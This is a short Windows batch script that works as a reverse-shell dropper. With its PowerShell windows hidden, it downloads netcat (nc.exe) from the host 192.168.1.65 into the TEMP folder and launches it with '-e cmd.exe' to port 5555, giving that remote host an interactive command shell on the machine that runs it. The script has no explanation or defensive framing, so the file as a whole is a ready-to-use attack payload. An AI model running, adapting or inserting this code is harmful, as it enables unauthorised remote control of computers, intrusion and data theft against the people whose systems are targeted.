@echo off
set ncpath=%TEMP%\nc.exe
set ncaddr=192.168.1.65
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'http://192.168.1.65/nc.exe' -OutFile '%ncpath%'"
powershell -WindowStyle Hidden -Command "Start-Process '%ncpath%' -ArgumentList '%ncaddr% 5555 -e cmd.exe' -WindowStyle Hidden"
